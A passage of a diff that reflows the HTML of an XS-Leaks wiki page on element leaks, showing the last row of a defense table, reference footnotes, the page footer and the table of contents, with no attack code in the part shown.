 |     Type leaks     |                                         ✔️                                         |                         ❌                          |                                ❌                                 | [RIP](https://xsleaks.dev/docs/defenses/isolation-policies/resource-isolation/) 🔗 [NIP](https://xsleaks.dev/docs/defenses/isolation-policies/navigation-isolation/) |
-</code></pre><h2 id=references>References
-<a class=anchor href=#references>#</a></h2><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p>The Unexpected Dangers of Dynamic JavaScript. <a href=https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf>link</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p>HTML Standard, [3.2.5.2.6 Embedded content], <a href=https://html.spec.whatwg.org/multipage/dom.html#fallback-content>link</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p>Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], <a href=https://www.usenix.org/system/files/sec19fall_staicu_prepub.pdf>link</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4 role=doc-endnote><p><a href=https://twitter.com/terjanq/status/1180477124861407234>https://twitter.com/terjanq/status/1180477124861407234</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></p></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/xsleaks/wiki/commit/ef18208f84e56644586afd07d58e1c4dc374a4c5 title="Last modified by NDevTK | June 11, 2021" target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
-<span>Last Modified: June 11, 2021</span></a></div><div><a class="flex align-center" href=https://github.com/xsleaks/wiki/edit/master/content//docs/attacks/element-leaks.md target=_blank rel=noopener><img src=/svg/edit.svg class=book-icon alt=Edit>
-<span>Edit this article</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><a href=#abusing-corb>Abusing CORB</a></li><li><a href=#abusing-getcomputedstyle>Abusing getComputedStyle</a></li><li><a href=#pdf>PDF</a></li><li><a href=#script-tag>Script tag</a></li><li><a href=#when-javascript-cant-be-used>When Javascript can’t be used</a></li><li><a href=#defense>Defense</a></li><li><a href=#references>References</a></li></ul></nav></aside></main></body></html>
+</code></pre>
+<h2 id=references>
+References
+<a class=anchor href=#references>#</a>
+</h2>
+<section class=footnotes role=doc-endnotes>
+<hr>
+<ol>
+<li id=fn:1 role=doc-endnote>
+<p>The Unexpected Dangers of Dynamic JavaScript. <a href=https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-lekies.pdf>link</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p>
+</li>
+<li id=fn:2 role=doc-endnote>
+<p>HTML Standard, [3.2.5.2.6 Embedded content], <a href=https://html.spec.whatwg.org/multipage/dom.html#fallback-content>link</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p>
+</li>
+<li id=fn:3 role=doc-endnote>
+<p>Leaky Images: Targeted Privacy Attacks in the Web, [3.4 Linking User Identities], <a href=https://www.usenix.org/system/files/sec19fall_staicu_prepub.pdf>link</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p>
+</li>
+<li id=fn:4 role=doc-endnote>
+<p><a href=https://twitter.com/terjanq/status/1180477124861407234>https://twitter.com/terjanq/status/1180477124861407234</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+</p>
+</article>
+<footer class=book-footer>
+<div class="flex flex-wrap justify-between">
+<div><a class="flex align-center" href=https://github.com/xsleaks/wiki/commit/ef18208f84e56644586afd07d58e1c4dc374a4c5 title="Last modified by NDevTK | June 11, 2021" target=_blank rel=noopener>
+<img src=/svg/calendar.svg class=book-icon alt=Calendar>
+<span>Last Modified: June 11, 2021</span>
+</a>
+</div>
+<div>
+<a class="flex align-center" href=https://github.com/xsleaks/wiki/edit/master/content//docs/attacks/element-leaks.md target=_blank rel=noopener>
+<img src=/svg/edit.svg class=book-icon alt=Edit>
+<span>Edit this article</span>
+</a>
+</div>
+</div>
+</footer>
+<div class=book-comments>
+</div>
+<label for=menu-control class="hidden book-menu-overlay"></label>
+</div>
+<aside class=book-toc>
+<nav id=TableOfContents>
+<ul>
+<li><a href=#abusing-corb>Abusing CORB</a></li>
+<li><a href=#abusing-getcomputedstyle>Abusing getComputedStyle</a></li>
+<li><a href=#pdf>PDF</a></li>
+<li><a href=#script-tag>Script tag</a></li>
+<li><a href=#when-javascript-cant-be-used>When Javascript can’t be used</a></li>
+<li><a href=#defense>Defense</a></li>
+<li><a href=#references>References</a></li>
+</ul>
+</nav>
+</aside>
+</main>
+</body>
+</html>
